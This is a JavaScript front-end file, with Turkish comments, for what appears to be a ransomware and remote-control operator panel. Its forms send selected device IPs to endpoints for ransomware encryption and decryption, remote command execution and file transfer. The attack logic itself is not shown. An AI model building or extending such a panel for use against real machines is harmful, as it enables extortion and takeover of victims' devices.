// Function to open the modal and set the selected device name
function openRansomwareEncModal(deviceName, MAC, IP) {
    var modal = document.getElementById("encryption_modal");
    var spanList = document.querySelectorAll('.selecteddevice');
    for (var i = 0; i < spanList.length; i++) {
        spanList[i].textContent = deviceName;
    }
    var input = document.getElementById("IP_input_1");
    input.value = IP;
    modal.style.display = "block";
}

function sendFormData_enc(event) {
    event.preventDefault();
    var formData = new FormData(document.getElementById("encryption_form"));
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "ransomware/encrypt", true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            // İstek tamamlandığında ve başarılı olduğunda veriyi işleyin
            var response = JSON.parse(xhr.responseText);
            document.getElementById("operation_result").textContent = response["msg"];
            closeModal()
            var response_modal = document.getElementById("response_modal");
            response_modal.style.display = "block";
        }
    };
    xhr.send(formData);
}

var form = document.getElementById("encryption_form");
form.addEventListener("submit", sendFormData_enc);

function openRansomwareDecModal(deviceName, MAC, IP) {
    var modal = document.getElementById("decryption_modal");
    var spanList = document.querySelectorAll('.selecteddevice');
    for (var i = 0; i < spanList.length; i++) {
        spanList[i].textContent = deviceName;
    }
    var input = document.getElementById("IP_input_2");
    input.value = IP;
    modal.style.display = "block";
}

function sendFormData_dec(event) {
    event.preventDefault();
    var formData = new FormData(document.getElementById("decryption_form"));
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "ransomware/decrypt", true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            // İstek tamamlandığında ve başarılı olduğunda veriyi işleyin
            var response = JSON.parse(xhr.responseText);
            document.getElementById("operation_result").textContent = response["msg"];
            closeModal()
            var response_modal = document.getElementById("response_modal");
            response_modal.style.display = "block";
        }
    };
    xhr.send(formData);
}

var form = document.getElementById("decryption_form");
form.addEventListener("submit", sendFormData_dec);

function openCommandModal(deviceName, MAC, IP) {
    var modal = document.getElementById("command_modal");
    var spanList = document.querySelectorAll('.selecteddevice');
    for (var i = 0; i < spanList.length; i++) {
        spanList[i].textContent = deviceName;
    }
    var input = document.getElementById("IP_input_3");
    input.value = IP;
    modal.style.display = "block";
}

function sendFormData_cmd(event) {
    event.preventDefault();
    var formData = new FormData(document.getElementById("command_form"));
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "command", true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            // İstek tamamlandığında ve başarılı olduğunda veriyi işleyin
            var response = JSON.parse(xhr.responseText);
            document.getElementById("operation_result").textContent = response["msg"];
            closeModal()
            var response_modal = document.getElementById("response_modal");
            response_modal.style.display = "block";
        }
    };
    xhr.send(formData);
}

var form = document.getElementById("command_form");
form.addEventListener("submit", sendFormData_cmd);

function openSendFileModal(deviceName, MAC, IP) {
    var modal = document.getElementById("file_send_modal");
    var spanList = document.querySelectorAll('.selecteddevice');
    for (var i = 0; i < spanList.length; i++) {
        spanList[i].textContent = deviceName;
    }
    var input = document.getElementById("IP_input_4");
    input.value = IP;
    modal.style.display = "block";
}

function sendFormData_fsend(event) {
    event.preventDefault();
    var formData = new FormData(document.getElementById("fsend_form"));
    
    //var fileInput = document.getElementById("filePath");
    //var filename = fileInput.files[0]["name"];    
    //formData.append("filePath", filename);
    
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "file/send", true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            // İstek tamamlandığında ve başarılı olduğunda veriyi işleyin
            var response = JSON.parse(xhr.responseText);
            document.getElementById("operation_result").textContent = response["msg"];
            closeModal()
            var response_modal = document.getElementById("response_modal");
            response_modal.style.display = "block";
        }
    };
    xhr.send(formData);
}

var form = document.getElementById("fsend_form");
form.addEventListener("submit", sendFormData_fsend);

function openRecvFileModal(deviceName, MAC, IP) {
    var modal = document.getElementById("file_recv_modal");
    var spanList = document.querySelectorAll('.selecteddevice');
    for (var i = 0; i < spanList.length; i++) {
        spanList[i].textContent = deviceName;
    }
    var input = document.getElementById("IP_input_5");
    input.value = IP;
    modal.style.display = "block";
}

function sendFormData_frecv(event) {
    event.preventDefault();
    var formData = new FormData(document.getElementById("frecv_form"));
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "file/recv", true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            // İstek tamamlandığında ve başarılı olduğunda veriyi işleyin
            var response = JSON.parse(xhr.responseText);
            document.getElementById("operation_result").textContent = response["msg"];
            closeModal()
            var response_modal = document.getElementById("response_modal");
            response_modal.style.display = "block";
        }
    };
    xhr.send(formData);
}

var form = document.getElementById("frecv_form");
form.addEventListener("submit", sendFormData_frecv);

// Function to close modals
function closeModal() {
    modalNames = ["encryption", "decryption", "command", "file_send", "file_recv", "response"]
    modalNames.forEach(modalName => {
        var modal = document.getElementById(modalName + "_modal");
        modal.style.display = "none";
    });
}